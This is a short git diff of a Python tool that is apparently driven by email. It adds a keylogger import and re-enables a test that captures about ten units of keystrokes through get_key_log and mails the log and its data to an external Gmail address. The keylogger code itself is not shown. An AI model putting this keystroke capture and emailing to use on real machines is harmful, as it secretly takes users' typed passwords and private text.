@@ -12,6 +12,7 @@ from constants import *
 from services.help import *
 from services.app import *
 from services.process import *
+from services.keylogger import *
 
 from services.html_generator import html_mail
 import notification
@@ -84,7 +85,7 @@ def setup():
     pass
 
 def main():
-    threading.Thread(target = check_email_thread).start()
+    # threading.Thread(target = check_email_thread).start()
 
     ##############################################################
     # Test read mail
@@ -100,8 +101,8 @@ def main():
 
     ##############################################################
     # Test send mail
-    # print_color('Test send mail', text_format.OKGREEN)
-    '''
+    print_color('Test send mail', text_format.OKGREEN)
+    
     try:
         # html = show_helps()
         # request = 'HELP'
@@ -109,18 +110,26 @@ def main():
         # html = get_apps()
         # request = 'APP get'
 
-        html = get_processes()
-        request = 'PROCESS get'
+        # html = get_processes()
+        # request = 'PROCESS get'
 
-        content = html_mail(request, html)
+        request = 'KEYLOGGER 10'
+        result = get_key_log(10)
+
+        content = {
+            'html': html_mail(request, result['html']),
+            'data': result['data']
+        }
+
+        # content = html_mail(request, html)
 
         mail = build_email_content(REMOTE_MAIL, ['hoangnhuquynh2015@gmail.com'], 'Demo send mail', content)
         host_mail.send_mail(mail)
+        print_color('Mail sent', text_format.OKGREEN)
     except Exception as e:
         print_color('Error while sending mail: ' + str(e), text_format.FAIL)
     
-    print_color('Mail sent', text_format.OKGREEN)
-    '''
+    
     ##############################################################
     # Test thread
 
